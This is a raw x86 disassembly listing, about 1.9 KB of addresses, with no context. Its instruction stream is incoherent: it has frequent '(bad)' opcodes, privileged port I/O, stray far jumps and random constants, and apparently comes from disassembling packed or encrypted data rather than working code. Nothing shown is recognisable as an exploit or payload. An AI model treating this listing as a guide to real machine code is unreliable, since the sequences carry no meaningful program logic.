  4158a1:	mov    bl,0xb3
  4158a3:	bound  eax,QWORD PTR [eax]
  4158a5:	sub    BYTE PTR [ebx+0x75],0x1
  4158a9:	out    0x7c,al
  4158ab:	cli    
  4158ac:	ret    
  4158ad:	mov    ebx,0x80d806f4
  4158b2:	pop    ebx
  4158b3:	pop    esi
  4158b4:	cmp    bh,BYTE PTR [edi]
  4158b6:	les    eax,FWORD PTR [edi+ebp*4-0x7177cf88]
  4158bd:	inc    eax
  4158be:	mov    ss:0x5a85f494,eax
  4158c4:	and    DWORD PTR [ecx+0x24],edi
  4158c7:	or     al,0x54
  4158c9:	xchg   esi,eax
  4158ca:	or     cl,BYTE PTR [ebx+eiz*4+0x7e]
  4158ce:	xchg   DWORD PTR [ecx-0x71],edx
  4158d1:	leave  
  4158d2:	jg     0x41594d
  4158d4:	fst    DWORD PTR [esi-0x42]
  4158d7:	retf   0x4f08
  4158da:	jmp    0x415941
  4158dc:	pushf  
  4158dd:	sbb    ah,BYTE PTR [ebx]
  4158df:	sub    DWORD PTR [edi-0x33e5fa6b],esp
  4158e5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4158e6:	pop    es
  4158e7:	jb     0x41595c
  4158e9:	icebp  
  4158ea:	rol    BYTE PTR ds:0xb2e8b0b7,1
  4158f0:	inc    esp
  4158f1:	push   ebx
  4158f2:	push   esi
  4158f3:	cs lahf 
  4158f5:	pop    ecx
  4158f6:	add    esi,edx
  4158f8:	push   ebp
  4158f9:	clc    
  4158fa:	leave  
  4158fb:	popf   
  4158fc:	sbb    BYTE PTR [ebx+0x6231335d],dh
  415902:	std    
  415903:	fld    QWORD PTR [edx-0x56750079]
  415909:	sbb    bh,BYTE PTR [edi-0x6]
  41590c:	inc    ebx
  41590d:	sub    al,al
  41590f:	push   cs
  415910:	inc    esi
  415912:	xchg   ecx,eax
  415913:	jecxz  0x4158a4
  415915:	push   0xffffff96
  415917:	jmp    0x620f:0x70505dec
  41591e:	xlat   BYTE PTR ds:[ebx]
  41591f:	pushf  
  415920:	daa    
  415921:	xchg   DWORD PTR [esi+0x64],eax
  415924:	int    0x26
  415926:	std    
  415927:	fld    TBYTE PTR [ecx-0x4b]
  41592a:	repnz mov ds:0x59bf0121,al
  415930:	je     0x41590d
  415932:	rol    al,cl
  415934:	mov    dh,0xc5
  415936:	jae    0x41594d
  415938:	leave  
  415939:	fidiv  DWORD PTR [esi+0x44]
  41593c:	add    eax,0x3480ffde
  415941:	nop
  415942:	fwait
  415943:	xor    BYTE PTR [ecx+0x56],ah
  415946:	sahf   
  415947:	scas   eax,DWORD PTR es:[edi]
  415948:	inc    edi
  415949:	aad    0x75
  41594b:	lock mov bl,0x5a
  41594e:	push   esp
  41594f:	or     cl,dh
  415951:	mov    al,ds:0x514b8df5
  415956:	das    
  415957:	xor    al,0xec
  415959:	inc    ebx
  41595a:	jecxz  0x415918
  41595c:	xchg   edi,eax
  41595d:	cdq    
  41595e:	mov    ah,0x7a
  415960:	(bad)  
  415961:	and    bh,BYTE PTR [edi]
  415963:	sub    bl,BYTE PTR [ecx-0x57]
  415966:	or     ebp,DWORD PTR [ebx+esi*1+0x47d2f3a2]
  41596d:	push   0xffffffc7
  41596f:	and    eax,0x6eb08d8
  415974:	jmp    0x5f3e:0x825fa1f4
  41597b:	stos   BYTE PTR es:[edi],al
  41597c:	lods   al,BYTE PTR ds:[esi]
  41597d:	xlat   BYTE PTR ds:[ebx]
  41597e:	adc    DWORD PTR [esi-0x783f54a],ecx
  415984:	push   eax
  415985:	jl     0x415918
  415987:	cmp    BYTE PTR [ebx],dl
  415989:	sbb    esi,DWORD PTR [ebp-0x3d6170c0]
  41598f:	inc    ecx
  415990:	mov    fs,WORD PTR [ecx]
  415992:	sub    eax,0xc7a597f9
  415997:	pop    es
  415998:	xor    eax,0x73a8abf9
  41599d:	(bad)  [ebp-0xb889eed]
  4159a3:	sbb    dl,BYTE PTR [edx-0x6e276eb0]
  4159a9:	rcr    DWORD PTR [ebx],0x4a
  4159ac:	(bad)  
  4159ad:	repz fs (bad) 
  4159b0:	std    
  4159b1:	jbe    0x415958
  4159b3:	idiv   BYTE PTR [ecx]
  4159b5:	push   ds
  4159b6:	cmovo  ebp,esp
  4159b9:	(bad)  
  4159ba:	out    dx,eax
  4159bb:	mov    cl,BYTE PTR cs:[ebp-0x5e]
  4159bf:	xchg   esi,eax
  4159c0:	ja     0x415970
  4159c2:	adc    dl,BYTE PTR [edi-0x78ea3aaa]
  4159c8:	pop    ss
  4159c9:	add    esp,DWORD PTR [edx-0x6d]
  4159cc:	or     BYTE PTR [ecx+0x30],dl
  4159cf:	aad    0xc1
  4159d1:	test   BYTE PTR [ecx],cl
  4159d3:	jb     0x415a54
  4159d5:	ret    
  4159d6:	mov    dl,0x62
  4159d8:	lods   al,BYTE PTR ds:[esi]
  4159d9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4159da:	into   
  4159db:	loop   0x41595d
  4159dd:	mov    al,0x40
  4159df:	sub    BYTE PTR [edi-0x6fdca632],0x2f
  4159e6:	mov    ds:0x85d89aa7,al
  4159eb:	dec    edx
  4159ec:	cmc    
  4159ed:	loope  0x4159f8
  4159ef:	sbb    eax,0xe8050129
  4159f4:	dec    ecx
  4159f5:	jmp    0xab7c3707
  4159fa:	mov    dh,bl
  4159fc:	mov    bl,0xbe
  4159fe:	out    0xbe,al
  415a00:	rcl    cl,0xbb
  415a03:	cli    
  415a04:	out    dx,al
  415a05:	(bad)  
  415a07:	leave  
  415a08:	es (bad) 
  415a0a:	lahf   
  415a0b:	fwait
  415a0c:	in     eax,dx
  415a0d:	mov    cl,0x4f
  415a0f:	fistp  WORD PTR [edi+0x5d]
  415a12:	lea    edi,[esi]
  415a14:	mov    ss,WORD PTR [esi+0x64]
  415a17:	or     BYTE PTR [edx+0x324e4217],0xce
  415a1e:	and    DWORD PTR [edi],0x1afcf6e6
  415a24:	inc    edi
  415a25:	stc    
  415a26:	dec    ebx
  415a27:	xchg   edx,eax
  415a28:	repz jo 0x4159cc
  415a2b:	mov    edi,DWORD PTR [edi]
  415a2d:	retf   0x3fa
  415a30:	stos   DWORD PTR es:[edi],eax
  415a31:	test   ebp,esp
  415a33:	retf   0xb875
  415a36:	and    al,dl
  415a38:	(bad)
  415a3b:	bnd js 0x415a58
  415a3e:	cmp    DWORD PTR [edx+0x4757a167],esp
  415a44:	popf   
  415a45:	cli    
  415a46:	jnp    0x4159fe
  415a48:	push   es
  415a49:	add    ebp,DWORD PTR [ebp+edx*2-0x36]
  415a4d:	add    DWORD PTR [ecx+0x12bdc08d],edi
  415a53:	mov    DWORD PTR [ecx-0x2a4f61ba],esi
  415a59:	sub    esp,edi
  415a5b:	mov    edx,0x3c313f23
  415a60:	push   ds
  415a61:	dec    edx
  415a62:	rcl    BYTE PTR [ecx],1
  415a64:	xor    al,0xe0
  415a66:	imul   edx,DWORD PTR [edx],0xffffffd8
  415a69:	out    dx,al
  415a6a:	cmp    esi,eax
  415a6c:	mov    esi,0x470004f8
  415a71:	cmp    eax,0x73719711
  415a76:	jnp    0x4159fb
  415a78:	mov    dl,0x3e
  415a7a:	in     eax,dx
  415a7b:	add    esp,DWORD PTR fs:[edx]
  415a7e:	inc    DWORD PTR [ebp+0x2e]
  415a81:	aad    0x79
  415a83:	mov    edx,0x6d2ab166
  415a88:	inc    ecx
  415a89:	call   ebp
  415a8b:	out    dx,al
  415a8c:	adc    esp,0xfde0604a
  415a92:	jmp    0x245c:0x417697f4
  415a99:	jle    0x415a36
  415a9b:	pop    ebx
  415a9c:	stos   BYTE PTR es:[edi],al
  415a9d:	retf   
  415a9e:	rol    DWORD PTR [edi-0x2c],cl
  415aa1:	xor    edx,DWORD PTR [ebp+0x51]
  415aa4:	mov    bl,0xbb
  415aa6:	inc    edx
  415aa7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415aa8:	call   0xf19b2b83
  415aad:	sub    BYTE PTR [edx],bl
  415aaf:	sub    esp,DWORD PTR [edi]
  415ab1:	mov    BYTE PTR [esi+0x3f3b7153],bh
  415ab7:	dec    ecx
  415ab8:	nop
  415ab9:	sbb    DWORD PTR [edi-0x49],eax
  415abc:	mov    ecx,0xe3a11fce
  415ac1:	fxch   st(4)
  415ac3:	in     eax,dx
  415ac4:	outs   dx,DWORD PTR ds:[esi]
  415ac5:	and    cl,bl
  415ac7:	fcom   DWORD PTR [ebx-0x145d9d73]
  415acd:	gs test ecx,ebp
  415ad0:	jne    0x415abe
  415ad2:	dec    ebp
  415ad3:	mul    DWORD PTR [ecx-0x41]
  415ad6:	fsub   QWORD PTR [edx]
  415ad8:	mov    eax,0x12972b63
  415add:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415ade:	outs   dx,BYTE PTR ds:[esi]
  415adf:	push   ecx
  415ae0:	mov    eax,ds:0x87d06c07
  415ae5:	test   edx,esp
  415ae7:	mov    WORD PTR [esi+ebx*4+0x3525ece6],fs
  415aee:	pop    ss
  415aef:	push   ds
  415af0:	mov    ds:0x94ebfa55,al
  415af5:	outs   dx,DWORD PTR ds:[esi]
  415af6:	or     DWORD PTR [edi+0x33],esi
  415af9:	jb     0x415b78
  415afb:	fist   DWORD PTR [edx+0x1]
  415afe:	add    BYTE PTR [ecx],ch
  415b00:	idiv   DWORD PTR [esi+0x7564fa22]
  415b06:	js     0x415b2f
  415b08:	fistp  DWORD PTR [eax]
  415b0a:	push   cs
  415b0b:	inc    ecx
  415b0c:	jl     0x415afe
  415b0e:	xchg   ebp,eax
  415b0f:	popa   
  415b10:	mov    tr6,edi
  415b13:	mov    cl,ah
  415b15:	ret    
  415b16:	mov    ss,WORD PTR [ebx]
  415b18:	or     dh,cl
  415b1a:	sbb    al,0x6d
  415b1c:	jbe    0x415ae9
  415b1e:	aad    0xcd
  415b20:	aaa    
  415b21:	mov    edx,0xb867d148
  415b26:	and    BYTE PTR ds:0x57f0fb00,cl
  415b2c:	push   ecx
  415b2d:	in     al,dx
  415b2e:	adc    BYTE PTR [ecx+0x5c],bl
  415b31:	dec    edx
  415b32:	add    eax,0x4a5db00b
  415b37:	mov    edi,0x17b1991b
  415b3c:	mov    al,ds:0x30186658
  415b41:	ja     0x415ac9
  415b43:	sub    DWORD PTR [edx-0x4fd2f68e],0x45883990
  415b4d:	pop    ss
  415b4e:	or     dh,BYTE PTR [eax+ebp*8]
  415b51:	mov    dh,0x3b
  415b53:	cmp    eax,0x286c3994
  415b58:	test   edx,0x6dfe8f7f
  415b5e:	(bad)  
  415b5f:	adc    al,0x74
  415b61:	mov    dl,0x73
  415b63:	mov    edx,0x8e0dadc8
  415b68:	mov    bh,0xc3
  415b6a:	mov    cl,0x73
  415b6c:	es aam 0xbf
  415b6f:	je     0x415b80
  415b71:	cmp    eax,DWORD PTR [eax-0x53]
  415b74:	(bad)  
  415b75:	xchg   ebx,eax
  415b76:	gs xor al,0xb9
  415b79:	xor    al,0x7d
  415b7b:	in     eax,0x90
  415b7d:	int    0x2b
  415b7f:	dec    ecx
  415b80:	mov    esp,0xb0aa075d
  415b85:	les    ebx,FWORD PTR [ecx+0x53234763]
  415b8b:	sar    edx,cl
  415b8d:	pop    ss
  415b8e:	imul   esi,DWORD PTR [ecx],0xc79dea03
  415b94:	mov    BYTE PTR [ebx-0x3e],bl
  415b97:	sar    BYTE PTR [ecx],1
  415b99:	loopne 0x415b31
  415b9b:	jmp    0xaec:0x1e424a08
  415ba2:	mov    edx,0xe3774b83
  415ba7:	mov    esp,esi
  415ba9:	mov    esi,0x1ff18a33
  415bae:	inc    eax
  415baf:	add    DWORD PTR [ebx+0x77],esi
  415bb2:	sar    dl,1
  415bb4:	mov    eax,0x2d830aa
  415bb9:	rol    BYTE PTR [edi-0x4c],cl
  415bbc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415bbd:	lock das 
  415bbf:	sub    eax,0xf32013eb
  415bc4:	add    DWORD PTR [ebx-0x53],esi
  415bc7:	(bad)  [edi-0x23]
  415bca:	mov    bl,0x6b
  415bcc:	jne    0x26e85561
  415bd2:	outs   dx,BYTE PTR ds:[esi]
  415bd3:	adc    BYTE PTR [edi],cl
  415bd5:	add    eax,0x58da6961
  415bda:	add    edi,DWORD PTR [ecx]
  415bdc:	inc    edi
  415bdd:	ss push ebp
  415bdf:	cmc    
  415be0:	test   eax,0x9fd769f1
  415be5:	test   al,0x2e
  415be7:	xor    al,0xd7
  415be9:	pop    esp
  415bea:	jo     0x415c13
  415bec:	cmp    esp,DWORD PTR [edx-0x31]
  415bef:	dec    eax
  415bf0:	daa    
  415bf1:	xor    edx,DWORD PTR [edi-0x65c0cc37]
  415bf7:	mov    esp,0xe8dbf706
  415bfc:	sbb    bl,BYTE PTR [esi-0x1a]
  415bff:	push   esi
  415c00:	rcr    BYTE PTR [ebx-0x6d],1
  415c03:	mov    esp,0x6e7266d2
  415c08:	push   eax
  415c09:	add    BYTE PTR [edx+eax*4+0x61],dl
  415c0d:	ds push eax
  415c0f:	pop    esi
  415c10:	ss in  eax,dx
  415c12:	shl    BYTE PTR ds:0x29ec358c,1
  415c18:	fnstsw WORD PTR [esi+0x2dbfb41e]
  415c1e:	jbe    0x415c76
  415c20:	shl    DWORD PTR [edi+0x54ad1506],cl
  415c26:	jmp    0x22622bda
  415c2b:	arpl   WORD PTR ds:0xa20c6c9f,sp
  415c31:	dec    eax
  415c32:	or     al,0xb1
  415c34:	sbb    ecx,ebp
  415c36:	jbe    0x415c58
  415c38:	xor    cl,dh
  415c3a:	jmp    0x415c4d
  415c3c:	outs   dx,DWORD PTR ds:[esi]
  415c3d:	neg    bl
  415c3f:	pop    edi
  415c40:	xor    DWORD PTR [ebp+edx*4-0x2e],edi
  415c44:	push   ebp
  415c45:	icebp  
  415c46:	pop    ss
  415c47:	es pop es
  415c49:	pop    esp
  415c4a:	sub    ebp,esi
  415c4c:	pop    es
  415c4d:	mov    edx,0xbd49ce9c
  415c52:	mov    al,ds:0x7369d6bc
  415c57:	es or  al,0x6d
  415c5a:	shr    al,0x4
  415c5d:	or     eax,0xd3b4d7de
  415c62:	cli    
  415c63:	in     al,dx
  415c64:	retf   
  415c65:	scas   al,BYTE PTR es:[edi]
  415c66:	xchg   ebp,eax
  415c67:	out    dx,eax
  415c68:	push   ebx
  415c69:	fcmovb st,st(3)
  415c6b:	cdq    
  415c6c:	sahf   
  415c6d:	mov    al,ds:0xecf97556
  415c72:	daa    
  415c73:	push   0x4d4aad93
  415c78:	pusha  
  415c79:	mov    ah,0x10
  415c7b:	inc    esp
  415c7c:	imul   ecx,DWORD PTR [esi],0x3e
  415c7f:	outs   dx,BYTE PTR ds:[esi]
  415c80:	sahf   
  415c81:	mov    dh,BYTE PTR [edi]
  415c83:	shr    bh,0x43
  415c86:	jl     0x415c36
  415c88:	xchg   DWORD PTR [edi+eax*1-0x4fdf8804],esi
  415c8f:	or     esp,edi
  415c91:	and    ch,bl
  415c93:	aas    
  415c94:	pushf  
  415c95:	sub    DWORD PTR [edx],edx
  415c97:	xor    eax,0x53da5e45
  415c9c:	mov    esi,fs
  415c9e:	fmul   QWORD PTR [edi]
  415ca0:	das    
  415ca1:	xchg   ebx,eax
  415ca2:	push   ecx
  415ca3:	popa   
  415ca4:	retf   0x1b8e
  415ca7:	xchg   esi,edi
  415ca9:	add    eax,0xd5ec0140
  415cae:	out    dx,eax
  415caf:	pop    es
  415cb0:	push   es
  415cb1:	and    cl,bh
  415cb3:	inc    edi
  415cb4:	push   esp
  415cb5:	mov    ecx,0xeed61cea
  415cba:	not    BYTE PTR [ebx+ecx*4+0x5]
  415cbe:	jmp    0x7373d97f
  415cc3:	test   BYTE PTR [ebx+0x49cb9e25],al
  415cc9:	inc    esi
  415cca:	push   ecx
  415ccb:	je     0x415cdb
  415ccd:	jb     0x415d3e
  415ccf:	fbld   TBYTE PTR [ecx+0x3]
  415cd2:	pop    esi
  415cd3:	sbb    eax,0x618d1d04
  415cd8:	adc    BYTE PTR [edi],dh
  415cda:	push   es
  415cdb:	test   al,0x28
  415cdd:	(bad)  [edx+0xf]
  415ce0:	leave  
  415ce1:	jl     0x415c92
  415ce3:	add    al,al
  415ce5:	pop    ebp
  415ce6:	or     eax,eax
  415ce8:	test   al,0x3e
  415cea:	out    0x51,eax
  415cec:	fistp  WORD PTR [ebp+0x4a624942]
  415cf2:	xor    esi,DWORD PTR [ecx]
  415cf4:	icebp  
  415cf5:	mov    edi,DWORD PTR [ebp-0x6b833c85]
  415cfb:	pop    ecx
  415cfc:	cli    
  415cfd:	sbb    esi,esp
  415cff:	push   edx
  415d00:	mov    dl,0xa2
  415d02:	lock scas eax,DWORD PTR es:[edi]
  415d04:	pop    ds
  415d05:	mov    ah,0x2c
  415d07:	inc    ebx
  415d08:	data16 hlt 
  415d0a:	pushw  es
  415d0c:	and    ch,0x82
  415d0f:	fs nop
  415d11:	fsubr  st(3),st
  415d13:	push   edi
  415d14:	mov    ah,0x88
  415d16:	adc    esi,ebp
  415d18:	push   es
  415d19:	adc    DWORD PTR [esi+0x34d1a1fa],edx
  415d1f:	mov    ebp,DWORD PTR [ecx-0xd440ef4]
  415d25:	loop   0x415d58
  415d27:	test   ebp,0xa38e8932
  415d2d:	and    ecx,ebx
  415d2f:	jne    0x415ce9
  415d31:	mul    DWORD PTR ds:0x82fd3215
  415d37:	jg     0x415cec
  415d39:	mov    bh,0x24
  415d3b:	sub    al,0xae
  415d3d:	cld    
  415d3e:	xchg   ecx,eax
  415d3f:	pushf  
  415d40:	dec    ebx
  415d41:	mov    ah,0x1f
  415d43:	mov    BYTE PTR [esi-0x12],dl
  415d46:	arpl   bp,si
  415d48:	ret    0x9d89
  415d4b:	fyl2xp1 
  415d4d:	cmp    esi,DWORD PTR [edx+0x19243d9a]
  415d53:	adc    ebx,eax
  415d55:	sar    BYTE PTR [ebx+ebp*2],1
  415d58:	iret   
  415d59:	or     eax,0x54730cc7
  415d5e:	mov    esi,0xdb22d54b
  415d63:	hlt    
  415d64:	jg     0x415d02
  415d66:	and    al,0x44
  415d68:	dec    ecx
  415d69:	out    0xc3,al
  415d6b:	adc    eax,0xd231dcd4
  415d70:	jno    0x415d90
  415d72:	adc    al,0x25
  415d74:	cdq    
  415d75:	cli    
  415d76:	add    BYTE PTR [eax+ecx*4],bh
  415d79:	add    DWORD PTR [ebx-0x2a],edx
  415d7c:	sub    dl,BYTE PTR [edx+0x7f]
  415d7f:	push   esi
  415d80:	mov    ebp,0x5b5feefb
  415d85:	dec    esp
  415d86:	mov    bl,0xab
  415d88:	out    0xaa,eax
  415d8a:	push   esi
  415d8b:	cmp    ch,BYTE PTR [ecx-0x6c2fd8d0]
  415d91:	stos   DWORD PTR es:[edi],eax
  415d92:	inc    edx
  415d93:	mov    ah,BYTE PTR [ebp+0x1a]
  415d96:	sti    
  415d97:	retf   
  415d98:	iret   
  415d99:	dec    ebp
  415d9a:	test   DWORD PTR [edi-0x7e28f709],eax
  415da0:	daa    
  415da1:	int3   
  415da2:	xchg   ebx,eax
  415da3:	lea    esi,[edi-0x5b]
  415da6:	mov    ds:0xfbaf2f20,eax
  415dab:	inc    ecx
  415dac:	out    0xa,eax
  415dae:	mov    ds:0x140c3a17,al
  415db3:	mov    dh,0xa3
  415db5:	jle    0x415dd9
  415db7:	stc    
  415db8:	pop    eax
  415db9:	out    0x12,eax
  415dbb:	mov    ch,0x16
  415dbd:	mov    al,0xab
  415dbf:	or     dh,dh
  415dc1:	leave  
  415dc2:	bound  ebp,QWORD PTR [edx-0x56bc5dfe]
  415dc8:	test   al,0x63
  415dca:	adc    DWORD PTR [esp+ebp*2+0x60cb550c],edx
  415dd1:	or     ebx,ebp
  415dd3:	xchg   edx,eax
  415dd4:	leave  
  415dd5:	xor    esp,DWORD PTR [ebx+0x387d978e]
  415ddb:	dec    ebp
  415ddc:	xor    al,0xea
  415dde:	push   ebx
  415ddf:	out    dx,eax
  415de0:	cmp    eax,DWORD PTR [ebp+0x1d0407f8]
  415de6:	pop    esp
  415de7:	aad    0xc5
  415de9:	mov    ch,0x5a
  415deb:	(bad)
  415df0:	jno    0x415de1
  415df2:	int    0x2d
  415df4:	pusha  
  415df5:	push   edi
  415df6:	push   edi
  415df7:	pushf  
  415df8:	jne    0x415e2d
  415dfa:	call   0x6ac4:0x914ac238
  415e01:	not    eax
  415e03:	lahf   
  415e04:	jns    0x415ded
  415e06:	sub    cl,BYTE PTR [edx+0x25]
  415e09:	leave  
  415e0a:	add    DWORD PTR [ecx+0x14d3a75d],esi
  415e10:	ficomp DWORD PTR [esp+eax*8]
  415e13:	mov    ecx,0x3cbad68
  415e18:	mov    edx,esp
  415e1a:	xchg   esp,eax
  415e1b:	push   esp
  415e1c:	xor    bh,cl
  415e1e:	sbb    eax,0xa4375744
  415e23:	in     eax,dx
  415e24:	ja     0x415dde
  415e26:	not    BYTE PTR [eax]
  415e28:	jg     0x415e25
  415e2a:	push   ss
  415e2b:	and    eax,0x909ae3dc
  415e30:	out    dx,al
  415e31:	xchg   BYTE PTR [ecx],al
  415e33:	popf   
  415e34:	and    eax,0xc71f925d
  415e39:	xor    al,al
  415e3b:	js     0x415dfc
  415e3d:	inc    edi
  415e3e:	push   cs
  415e3f:	push   edx
  415e40:	or     al,0x46
  415e42:	add    al,0x17
  415e44:	out    dx,al
  415e45:	xor    al,0xef
  415e47:	sbb    bh,dl
  415e49:	push   ds
  415e4a:	pop    ds
  415e4b:	ret    
  415e4c:	jnp    0x415e7b
  415e4e:	imul   edx,ecx,0xcb3c63e0
  415e54:	inc    esi
  415e55:	cwde   
  415e56:	fiadd  DWORD PTR [edi+0xe]
  415e59:	fld    st(5)
  415e5b:	push   esp
  415e5c:	xchg   DWORD PTR [esi],edi
  415e5e:	in     eax,dx
  415e5f:	xchg   esi,eax
  415e60:	add    al,0x4a
  415e62:	jno    0x415e66
  415e64:	mov    ah,0xd1
  415e66:	pushf  
  415e67:	sub    ecx,DWORD PTR [edx-0x7c3941b4]
  415e6d:	mov    al,BYTE PTR [esi]
  415e6f:	call   0xd6a7:0x6a2b7257
  415e76:	mov    ch,0x22
  415e78:	mov    ds:0x1fc82703,al
  415e7d:	out    dx,eax
  415e7e:	fiadd  DWORD PTR [ebp-0x6a]
  415e81:	(bad)  
  415e82:	fadd   DWORD PTR ds:0x18a3bb8a
  415e88:	pandn  mm6,QWORD PTR [ebx]
  415e8b:	out    0x5c,eax
  415e8d:	jno    0x415e58
  415e8f:	mov    ecx,?
  415e91:	shl    ecx,cl
  415e93:	dec    ebx
  415e94:	xor    dh,BYTE PTR [edx]
  415e96:	xor    al,0x94
  415e98:	inc    ebx
  415e99:	int3   
  415e9a:	hlt    
  415e9b:	xchg   edi,eax
  415e9c:	fldenv [edi+edx*1-0x257c8125]
  415ea3:	xchg   ecx,eax
  415ea4:	call   0x6b1f7266
  415ea9:	shl    DWORD PTR [esi-0x62],0xd1
  415ead:	push   ds
  415eae:	sub    DWORD PTR [ecx+0x30],edx
  415eb1:	mov    eax,0x2f4c1341
  415eb6:	jb     0x415f29
  415eb8:	popa   
  415eb9:	iret   
  415eba:	(bad)  
  415ebb:	push   ds
  415ebc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415ebd:	mov    ch,BYTE PTR [eax-0x42]
  415ec0:	adc    esp,esp
  415ec2:	xchg   si,ax
  415ec4:	out    dx,eax
  415ec5:	and    BYTE PTR [ebx-0x76],dh
  415ec8:	iret   
  415ec9:	mov    bl,0x50
  415ecb:	loopne 0x415f31
  415ecd:	or     al,0xe0
  415ecf:	mov    cl,0x3e
  415ed1:	or     dh,BYTE PTR [eax]
  415ed3:	imul   ebx,DWORD PTR [ecx+0x3e106943],0x13ae39d7
  415edd:	fs mov bh,0x80
  415ee0:	sbb    bl,BYTE PTR [ebx]
  415ee2:	xor    BYTE PTR [esi+0x3b],bh
  415ee5:	mov    cl,0x2
  415ee7:	and    eax,0x4d2a1bbb
  415eec:	push   edx
  415eed:	fiadd  DWORD PTR [ebx]
  415eef:	jb     0x415ef9
  415ef1:	repz sbb al,0x8c
  415ef4:	jns    0x415ef8
  415ef6:	fstp   QWORD PTR [edi+0x6b5cd594]
  415efc:	push   cs
  415efd:	inc    ebp
  415efe:	cmp    eax,0x4c4f146a
  415f03:	mov    esp,0xe387ef1a
  415f09:	cmp    al,0xf3
  415f0b:	xchg   esp,eax
  415f0c:	mov    eax,ds:0xf494d17e
  415f11:	(bad)  
  415f13:	add    BYTE PTR [ecx],al
  415f15:	aas    
  415f16:	adc    eax,0x8fb30e50
  415f1b:	shl    BYTE PTR [ecx+0x2],0xad
  415f1f:	stc    
  415f20:	or     ecx,DWORD PTR [ecx-0x432afede]
  415f26:	es dec esp
  415f28:	pusha  
  415f29:	out    0x15,al
  415f2b:	stos   DWORD PTR es:[edi],eax
  415f2c:	mov    ebp,0x3737a895
  415f31:	es into 
  415f33:	bound  esp,QWORD PTR [edi]
  415f35:	dec    esi
  415f36:	jmp    0x415f11
  415f38:	fld    DWORD PTR [esi]
  415f3a:	jge    0x415ec0
  415f3c:	push   esi
  415f3d:	loope  0x415ec5
  415f3f:	push   ebp
  415f40:	into   
  415f41:	mov    ebp,0x396edb65
  415f46:	out    dx,al
  415f47:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415f48:	cmp    BYTE PTR [edi],ch
  415f4a:	outs   dx,DWORD PTR ds:[esi]
  415f4b:	mov    BYTE PTR [eax+0x1a3cb40d],0x18
  415f52:	scas   eax,DWORD PTR es:[edi]
  415f53:	outs   dx,BYTE PTR ds:[esi]
  415f54:	cmp    ebp,ebx
  415f56:	shl    DWORD PTR [eax-0x7a817d79],1
  415f5c:	lods   al,BYTE PTR ds:[esi]
  415f5d:	or     edx,DWORD PTR [ecx+edi*2-0x57b65953]
  415f64:	add    ecx,DWORD PTR [ebp+0x7e]
  415f67:	xchg   edx,eax
  415f68:	cmp    BYTE PTR [esi-0x6790c2d1],bl
  415f6e:	fadd   st(7),st
  415f70:	ins    BYTE PTR es:[edi],dx
  415f71:	adc    esi,DWORD PTR [esi]
  415f73:	pop    eax
  415f74:	jmp    0x415f4e
  415f76:	add    BYTE PTR [esp+ebp*1+0x75],al
  415f7a:	xchg   esi,eax
  415f7b:	and    ebp,eax
  415f7d:	sbb    BYTE PTR [esi+0x105d92c7],cl
  415f83:	frstor [ecx]
  415f85:	repnz xchg ebp,eax
  415f87:	ja     0x415f4d
  415f89:	(bad)  
  415f8a:	lea    esi,[ecx-0x45]
  415f8d:	lea    esi,[esi]
  415f8f:	(bad)  
  415f91:	(bad)  
  415f92:	adc    bl,0x80
  415f95:	fimul  DWORD PTR [edi+0x64ec8c99]
  415f9b:	fdiv   DWORD PTR [esi-0x2f]
  415f9e:	mov    al,0xeb
  415fa0:	mov    ch,BYTE PTR [ecx]
  415fa2:	pop    es
  415fa3:	push   eax
  415fa4:	sub    BYTE PTR [eax+ebx*8-0x74babd75],bh
  415fab:	mov    esi,0x57f4450
  415fb0:	(bad)  
  415fb1:	pop    edx
  415fb2:	js     0x415fae
  415fb4:	lahf   
  415fb5:	(bad)  
  415fb6:	jmp    0x415fc3
  415fb8:	daa    
  415fb9:	push   0x2834397e
  415fbe:	mov    cl,0x17
  415fc0:	jnp    0x415f4a
  415fc2:	xchg   ebx,eax
  415fc3:	sub    al,0xff
  415fc5:	push   es
  415fc6:	mov    bh,0xf2
  415fc8:	jne    0x415fdd
  415fca:	cmc    
  415fcb:	dec    ecx
  415fcc:	pop    edx
  415fcd:	jno    0x415fca
  415fcf:	xor    BYTE PTR [ebx+0x49],dh
  415fd2:	sbb    BYTE PTR [ecx],ah
  415fd4:	in     al,dx
  415fd5:	fsub   DWORD PTR [eax-0x5d796557]
  415fdb:	into   
  415fdc:	jp     0x415f75
  415fde:	xor    cl,cl
  415fe0:	inc    esp
  415fe1:	fwait
  415fe2:	leave  
  415fe3:	cmc    
  415fe4:	or     cl,BYTE PTR [edx+0x28]
  415fe7:	push   ebx
  415fe8:	xor    DWORD PTR [ecx+0x5e],ebx
  415feb:	sahf   
  415fec:	or     BYTE PTR [ecx+0x1ca3929e],0xc
  415ff3:	test   BYTE PTR [edx],0xb9
  415ff6:	xchg   DWORD PTR [esp+esi*2+0x5],esp
  415ffa:	or     al,0x4d
  415ffc:	jns    0x416024
  415ffe:	inc    edx
  415fff:	(bad)  
  416000:	cdq    
  416001:	adc    ch,dh
  416003:	je     0x41600b
  416005:	cmp    eax,0xae5484b6
  41600a:	cmp    BYTE PTR [ecx+0x1b70407c],al
  416010:	hlt    
  416011:	sub    ebx,ebp
  416013:	ja     0x415fcb
  416015:	mov    BYTE PTR [ebp+ecx*8+0x1b],bl
  416019:	lahf   
  41601a:	add    ebp,DWORD PTR [eax]
  41601c:	fucompp 
  41601e:	aas    
  41601f:	push   0xffffffed
  416021:	adc    eax,0x3c42bb3a
  416026:	push   ebx
  416027:	jb     0x416060
  416029:	inc    BYTE PTR [ebx]
  41602b:	xor    eax,0xdd2057c8
  416030:	mov    cl,0xf
  416032:	inc    eax
  416033:	stos   BYTE PTR es:[edi],al
  416034:	or     al,0x32
  416036:	in     eax,0x56
  416038:	push   edi
  416039:	pop    edx
  41603a:	lds    ecx,FWORD PTR [ecx-0x69]
  41603d:	scas   eax,DWORD PTR es:[edi]
  41603e:	pop    edx
  41603f:	or     DWORD PTR [eax+0x37dc3742],esi
  416045:	inc    ecx
  416046:	add    ebx,DWORD PTR [ecx+0x4c7be337]
  41604c:	into   
  41604d:	adc    DWORD PTR [ebp-0xa2c0f4c],edx
  416053:	dec    BYTE PTR [eax]
  416055:	inc    edi
  416056:	pop    edi
  416057:	mov    dl,0xcf
